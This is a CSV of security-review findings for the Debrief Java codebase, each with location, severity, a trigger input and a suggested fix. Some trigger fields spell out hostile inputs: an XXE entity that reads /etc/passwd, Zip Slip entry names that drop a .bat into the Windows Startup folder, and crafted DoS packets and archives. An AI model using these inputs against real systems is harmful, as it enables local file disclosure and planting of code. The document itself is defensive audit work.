id,slice,plugin,package,class,file_path,category,issue_type,severity,confidence,status,title,description,instances,trigger_input,suggested_fix,effort,llm_value,related,github_issue
CR-011,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.KML,ImportKML,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/KML/ImportKML.java,security,zip-bomb,High,High,candidate,KMZ entries inflated fully into memory with no size cap,"doZipImport() copies every '*.kml' entry byte-by-byte into a ByteArrayOutputStream with no limit on inflated size or entry count, then doImport() re-materialises it as a String (2 bytes/char) plus a stripped copy and a DOM, so peak memory is 5-6x the inflated size. A small KMZ with a highly compressible KML entry exhausts the JVM heap (OutOfMemoryError) and takes down the workbench job. Reached through KMLLoader for any *.kmz opened or dropped.",L284-L298; L306-L318; org.mwc.debrief.core KMLLoader.java L45,A 1 MB .kmz containing a.kml that inflates to 2 GB of spaces/comments.,Track bytes read per entry and abort above a budget (e.g. 256 MB); stream the entry straight into the SAX/DOM parser instead of buffering; use a buffered read(byte[]) loop.,S,Needed to follow the multiple in-memory copies across doZipImport/inputStreamAsString/stripNonValidXMLCharacters to size the amplification.,-,
CR-012,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.XML.csv_gz,Import_CSV_GZ,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/XML/csv_gz/Import_CSV_GZ.java,security,zip-bomb,High,High,candidate,GZIP payload inflated fully into memory with no cap (gzip bomb),"doZipImport() reads the entire GZIPInputStream one byte at a time into a ByteArrayOutputStream before parsing. gzip compresses runs ~1000:1, so a 10 MB .csv.gz can inflate to ~10 GB and OOM the workbench; the byte-at-a-time loop also makes legitimate multi-hundred-MB files extremely slow. On exception the GZIPInputStream is not closed and the failure is only printStackTrace()d.",L1274-L1295; org.mwc.debrief.core CSV_GZ_Loader.java L50,"A small .csv.gz whose payload is gigabytes of repeated characters, opened via the CSV_GZ loader.",Wrap the GZIPInputStream in a BufferedReader and feed doImport() line by line with a running byte budget; never buffer the whole file; close in finally and report errors.,S,grep-able,-,
CR-013,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,PlotTracks,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/PlotTracks.java,algorithm-correctness,time-handling,High,Medium,candidate,Time box labels taken from an arbitrary first track and ignore its stepsToSkip,"createTimeNarrativeShapes() builds the animated time captions from trackData.getTracks().get(0) only (L542) and schedules them from delay 0 (L556) with one step per point (L537, L590). The track list comes from CoreCoordinateRecorder._tracks, a HashMap (order depends on name hashes), so the 'first' track may be one that started late (stepsToSkip>0) or ended early. Its first point's timestamp is then shown at t=0 while the markers for that time appear stepsToSkip*interval later, and no captions exist after the shorter track ends. The exported PPTX shows wrong times for the displayed positions.",L530-L600 (esp. L537; L542; L556); CoreCoordinateRecorder.java L190; L283; L352-L354,Record a PPTX export where track B becomes visible several steps after track A and B hashes before A: the time caption reads B's first DTG while A is still at its earlier positions.,"Keep the recorder's _times list (one DTG per step) in TrackData and generate one caption per step from it, with delay = stepIndex*interval; do not derive captions from a track.",M,Requires following the data flow from the HashMap in the recorder through the exporter to see that ordering and stepsToSkip both change the visible result.,-,
CR-014,A2,org.mwc.debrief.legacy,Debrief.ReaderWriter.powerPoint,UnpackFunction,org.mwc.debrief.legacy/src/Debrief/ReaderWriter/powerPoint/UnpackFunction.java,security,zip-slip,High,High,candidate,"PPTX template extracted with zip4j 1.3.2 extractAll, no entry-name canonical ...","unpackFunction() hands the user-selected 'master template' .pptx to net.lingala.zip4j.core.ZipFile.extractAll(). zip4j 1.3.2 (bundled in libs/) predates the Zip Slip fix and writes each entry to outPath + entryName without verifying the canonical path stays under outPath (I inspected the bundled UnzipEngine class: no getCanonicalPath/illegal-name check). Entry names such as ../../../../Users/x/AppData/Roaming/... therefore write arbitrary files. Reached from PrefsPage.updateDimensions() as soon as a template path is typed, from ExportPPTDialog.okPressed() (validateDonorFile) and from every PPTX export.",L67-L68; PlotTracks.java L155; org.mwc.debrief.core PrefsPage.java L182,"A .pptx (zip) whose entry names include ../ segments, e.g. '../../../startup/evil.bat', selected as the PowerPoint master template in Preferences (or distributed as a 'corporate template').","Upgrade zip4j to >= 2.x (API changed) or iterate FileHeaders and reject any entry whose File(outPath,name).getCanonicalPath() does not start with outPath's canonical path before extractFile(). Also cap total extracted size.",M,"Needed to trace that the template path flows from a preference/dialog into a library call, and to check the bundled jar version's UnzipEngine for the missing canonical-path guard.",Zip Slip (Snyk 2018) - zip4j fixed in 1.3.3,
CR-015,A3,org.mwc.cmap.core,org.mwc.cmap.core.operations,RightClickCutCopyAdaptor,org.mwc.cmap.core/src/org/mwc/cmap/core/operations/RightClickCutCopyAdaptor.java,security,unsafe-deserialization,High,High,candidate,Clipboard bytes deserialized with unfiltered ObjectInputStream (EditableTrans...,"EditableTransfer.nativeToJava wraps the raw byte[] pulled from the system clipboard (SWT type name CMAP_EDITABLE, L519) in a plain ObjectInputStream and calls readObject() with no ObjectInputFilter, class allowlist or size limit. Any other process on the desktop (or an RDP/VNC/browser clipboard-sync peer) can place bytes under that type name, so a Paste, or even a Cut (CutItem.rememberPreviousContents L221 reads the clipboard before overwriting it), deserializes attacker-controlled data. The bundle classloader reaches every Serializable class in cmap.core and its required bundles, so both DoS payloads (nested HashSet/serialDOS) and any available gadget chain execute during readObject before the Editable[] cast at L606.",L519-L521; L593-L616; L221,Attacker process calls SetClipboardData/ XSetSelection with format CMAP_EDITABLE containing a serialized SerialDOS object graph; analyst right-clicks Paste (or Cut) in the Outline view.,"Install an ObjectInputFilter (ObjectInputStream.setObjectInputFilter) that allowlists MWC.*/Debrief.* Editable classes, java.lang/java.util basics and arrays, with maxdepth/maxarray/maxbytes limits; alternatively keep the clipboard payload in-process (store the Editable[] in a static and only put an opaque token on the clipboard).",M,Needs reasoning that SWT ByteArrayTransfer contents originate outside the JVM and that Cut also reads the clipboard; a grep for ObjectInputStream finds the line but not the trust boundary.,-,
CR-016,A3,org.mwc.debrief.dis,org.mwc.debrief.dis.core,DISModule,org.mwc.debrief.dis/src/org/mwc/debrief/dis/core/DISModule.java,security,unbounded-allocation,High,High,candidate,EventReport PDU variableDatumLength drives byte[] allocation and iterator wit...,"handleEvent takes variableDatumLength straight from the UDP packet (VariableDatum.unmarshal reads it with readInt, so it can be negative or up to 2^31-1) and does `new byte[thisLen]` (L271-L272), then iterates thisLen times calling iter.next() on the chunk list (L275-L276). Because VariableDatum.unmarshal stops filling variableData at EOF and swallows the exception, chunks.size() is normally far smaller than thisLen: a 2 GB length gives OutOfMemoryError, a negative length gives NegativeArraySizeException, and any length larger than the remaining packet gives NoSuchElementException. All escape logPDU into NetworkDISProvider.startListening, whose catch is outside the receive loop (L288), so the DIS listener thread dies after one packet.",L267-L288,"Single 8 KB multicast datagram: PDU type 21 (EventReport), numberOfVariableDatumRecords=1, variableDatumLength=0x7FFFFFFF (or 0xFFFFFFFF) sent to the configured DIS group/port.","Clamp thisLen to chunks.size() (and to a sane max, e.g. 64 KB), treat DIS datum length as bits (divide by 8) per IEEE 1278.1, and iterate over the chunk list rather than the declared length.",S,Requires combining the swallowed-EOF behaviour in VariableDatum.unmarshal with the trusting loop in DISModule and the catch placement in NetworkDISProvider.,-,
CR-017,A3,org.mwc.debrief.dis,org.mwc.debrief.dis.providers.network,NetworkDISProvider,org.mwc.debrief.dis/src/org/mwc/debrief/dis/providers/network/NetworkDISProvider.java,bug,logic-error,High,High,candidate,Any exception from one PDU permanently kills the DIS receive loop,"startListening wraps the entire `while (_running)` loop in a single try (L241-L289); the generic catch at L288 sits outside the loop, so an exception thrown while parsing or dispatching ONE datagram (see DISModule row, or any listener bug) ends the loop, the socket is closed in finally and the view keeps showing it is connected while no further PDUs are processed. Real type: missing per-packet error isolation (robustness/DoS).",L241-L303,Any malformed EventReport PDU (see DISModule row) or a listener throwing on unexpected entity id.,Move the try/catch inside the while loop so a bad packet is logged and skipped; only exit on SocketException when !_running.,S,Simple structurally but only visible by reading loop/try nesting.,-,
CR-018,A4+A11,.github,-,main.yml,.github/workflows/main.yml,supply-chain,vulnerable-dependency,High,High,candidate,Windows product ships AdoptOpenJDK 11.0.5+10 (Oct 2019) fetched without checksum,"main.yml L152-157 wget-downloads OpenJDK11U-jre_x64_windows_hotspot_11.0.5_10.zip from the archived AdoptOpenJDK GitHub releases with no SHA256 verification, caches it (L145-150) and bundles it into org.mwc.debrief.combined.feature/win-64/jre (L162-169). Windows users therefore run a JRE missing roughly 25 quarterly CPUs (e.g. CVE-2020-2803/2805 deserialisation, CVE-2020-14583, CVE-2021-2163, CVE-2022-21496 JNDI, CVE-2023-21930 TLS, CVE-2024-21011..21094) while Debrief parses untrusted XML/ZIP/Office files with JDK classes; a tampered download would also be bundled silently. || L156-157 download OpenJDK11U-jre_x64_windows_hotspot_11.0.5_10.zip and L162-169 stage it into org.mwc.debrief.combined.feature/win-64 so it is bundled inside DebriefNG-Windows64Bit.zip and the MSI (contribs/msi/make_x64msi.sh L13 uses the same URL). 11.0.5 predates roughly 25 quarterly CPUs; every released Windows Debrief runs the analyst's untrusted data files on a JRE with dozens of known CVEs (e.g. CVE-2020-2803, CVE-2020-14583, CVE-2021-2163, CVE-2022-21496, CVE-2023-21930, CVE-2024-21011). The cache key `win-jre-11.0.5-10` (L150) pins it further.",.github/workflows/main.yml L145-L157; L162-L169; L145-157; L162-169; contribs/msi/make_x64msi.sh L13,Any release build: the JRE zip is trusted as downloaded; end-user opens a malicious file with the bundled 2019 JRE.,"Pin the latest Temurin 11/17 (or 25 per #5237) via the Adoptium API with the published SHA256 checked (sha256sum -c) or use actions/setup-java's JRE download with checksum, and bump on each release.",S,grep-able for the URL; the impact needed the age comparison and product-bundling step.,#5237; CVE-2022-21496; CVE-2020-2803,
CR-019,A4,org.mwc.cmap.legacy,-,commons-compress-1.19.jar,org.mwc.cmap.legacy/libs/commons-compress-1.19.jar,supply-chain,vulnerable-dependency,High,Medium,candidate,commons-compress 1.19 zip OOM (CVE-2021-36090) reachable via .docx import,"commons-compress 1.19 is vulnerable to CVE-2021-36090 (crafted ZIP makes ZipFile/ZipArchiveInputStream allocate huge memory), CVE-2021-35515/35516/35517 (7z, tar infinite loop/OOM) and CVE-2024-25710. It is on the cmap.legacy Bundle-ClassPath (L18) and is the ZIP implementation POI 4.1.2's OPCPackage uses when Debrief opens OOXML files, so it is reachable from MsDocXLoader (.docx) and ImportASWDataDocument (XWPFDocument at L616). Debrief's own use is only GzipUtils filename helpers in Import_CSV_GZ tests.","org.mwc.cmap.legacy/META-INF/MANIFEST.MF L18; org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportRiderNarrativeDocument.java L343, L354; org.mwc.debrief.legacy/src/Debrief/ReaderWriter/Word/ImportASWDataDocument.java L616; org.mwc.debrief.core/plugin.xml L228",A .docx whose ZIP central directory is crafted per CVE-2021-36090 opened via File > Open (extension docx).,Upgrade commons-compress to 1.26.x+ together with POI 5.x (POI 5 requires commons-compress 1.21+).,S,Required knowing POI delegates OOXML zip handling to commons-compress; OSV alone flags the jar but not the .docx path.,CVE-2021-36090; CVE-2021-35515; CVE-2021-35516; CVE-2021-35517; CVE-2024-25710; #5237,
CR-020,A4,org.mwc.cmap.media,-,xuggle-xuggler.jar,org.mwc.cmap.media/lib/xuggle-xuggler.jar,supply-chain,vulnerable-dependency,High,Medium,candidate,Xuggler 4.0.1084 (2011) ships unpatched native FFmpeg for analyst media,"xuggle-xuggler.jar (Implementation-Version 4.0.1084, built 2011, project abandoned 2013) wraps native libavcodec/libavformat from the FFmpeg 0.x era via jni_helper.jar and is loaded by NativeLibrariesLoader; PlayingThread L228 IContainer.make() opens whatever video/audio file the analyst attaches to a plot. Every FFmpeg memory-safety CVE published since 2011 therefore applies to the shipped natives and no update is possible. Plugin is shipped in org.mwc.cmap.combined.feature.",org.mwc.cmap.media/META-INF/MANIFEST.MF L18-L26; org.mwc.cmap.media/src/org/mwc/cmap/media/xuggle/impl/PlayingThread.java L228; org.mwc.cmap.media/src/org/mwc/cmap/media/xuggle/NativeLibrariesLoader.java,A crafted .avi/.mp4 opened in the Debrief media player view.,"Replace Xuggler with JavaFX Media, VLCJ (system libvlc) or a maintained javacv/ffmpeg-platform artifact that is updated with the build; or drop video playback.",L,No Maven coordinates exist so OSV/Dependabot cannot flag it; needed manifest inspection and knowing Xuggler embeds FFmpeg natives.,#5237,
CR-021,A4,org.mwc.debrief.core,-,jdom-1.0.jar,org.mwc.debrief.core/libs/jdom-1.0.jar,supply-chain,vulnerable-dependency,High,High,candidate,JDOM 1.0 SAXBuilder (CVE-2021-33813) parses untrusted .gpx with XXE enabled,"JDOM before 2.0.6.1 (CVE-2021-33813) resolves external entities by default and has no safeguards; jdom-1.0.jar dates from 2004. GpxUtil.getDocumentSource builds a default SAXBuilder (L87) and parses the GPX file stream (L88) for every GPX import registered at plugin.xml L176, so a hostile .gpx can exfiltrate local files via an external DTD/entity or trigger billion-laughs.",org.mwc.debrief.core/META-INF/MANIFEST.MF L6 (Bundle-ClassPath); org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/GpxUtil.java L87-L88; org.mwc.debrief.core/plugin.xml L176,".gpx starting with <!DOCTYPE gpx [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]> and using &xxe; in a <name> element","Replace with the platform JAXP parser (secure-processing on, disallow-doctype-decl) or JDOM 2.0.6.1 with builder.setFeature(""http://apache.org/xml/features/disallow-doctype-decl"", true); setExpandEntities(false).",S,grep-able for SAXBuilder; the dependency-age link is what makes it a supply-chain row.,CVE-2021-33813,
CR-022,A4,org.mwc.debrief.legacy,-,pdfbox-2.0.3.jar,org.mwc.debrief.legacy/libs/pdfbox-2.0.3.jar,supply-chain,vulnerable-dependency,High,High,candidate,PDFBox 2.0.3 (2016) DoS/infinite-loop CVEs reachable via .pdf import,"pdfbox 2.0.3 and fontbox 2.0.3 are subject to CVE-2018-8036 (infinite loop in AFM parser), CVE-2018-11797 (infinite loop in crafted PDF), CVE-2021-27807/27906 (infinite loop / OOM loading PDF) and CVE-2021-31811/31812 (OOM and infinite loop). PDDocument.load(inputStream) is called on any file the analyst opens via PdfLoader (registered for extension pdf in org.mwc.debrief.core/plugin.xml L232), so a crafted PDF hangs or crashes the workbench.","org.mwc.debrief.legacy/META-INF/MANIFEST.MF L7, L9; Debrief/ReaderWriter/Word/ImportNarrativeDocument.java L1901-L1905; org.mwc.debrief.core/plugin.xml L232; org.mwc.debrief.core/src/org/mwc/debrief/core/loaders/PdfLoader.java L39-L40",Drag a PDF crafted per CVE-2021-31812 (self-referencing page tree) onto the plot; PDFTextStripper never returns.,Upgrade pdfbox/fontbox to 2.0.31+ (drop-in for the 2.0 API) or 3.0.x; run the import in a cancellable Job with a timeout.,S,grep-able once the version is known; reachability needed reading the loader registration.,CVE-2018-8036; CVE-2018-11797; CVE-2021-27807; CVE-2021-27906; CVE-2021-31811; CVE-2021-31812; #5237,
CR-023,A4,org.mwc.debrief.legacy,-,zip4j-1.3.2.jar,org.mwc.debrief.legacy/libs/zip4j-1.3.2.jar,supply-chain,vulnerable-dependency,High,High,candidate,zip4j 1.3.2 zip-slip: extractAll() on user-chosen .pptx template,"zip4j 1.3.2 (2015) has no path-traversal check in ZipFile.extractAll (CVE-2018-1002202) plus DoS on crafted archives (CVE-2022-24615) and skipped integrity checks (CVE-2023-22899). Debrief.ReaderWriter.powerPoint.UnpackFunction L67-68 calls new ZipFile(pptx_path).extractAll(unpack_path) on the PowerPoint export template the analyst picks in Preferences (org.mwc.debrief.core PrefsPage L115-119, invoked at L180), so a crafted template writes files anywhere the user can write. Referenced by MANIFEST.MF L17 and shipped.","org.mwc.debrief.legacy/META-INF/MANIFEST.MF L17; Debrief/ReaderWriter/powerPoint/UnpackFunction.java L67-L68; org.mwc.debrief.core/src/org/mwc/debrief/core/preferences/PrefsPage.java L115-L119, L180","A .pptx 'template' sent to an analyst containing an entry named ../../../../Users/<user>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/x.bat, selected in Preferences > Debrief > PPT template",Upgrade to net.lingala.zip4j:zip4j 2.11.5+ (API changed: package net.lingala.zip4j.ZipFile) and additionally canonicalise each entry path against the target directory before extraction.,S,Needed tracing PrefsPage -> PlotTracks -> UnpackFunction to show the archive is user-supplied rather than a build artefact.,CVE-2018-1002202; CVE-2022-24615; CVE-2023-22899,
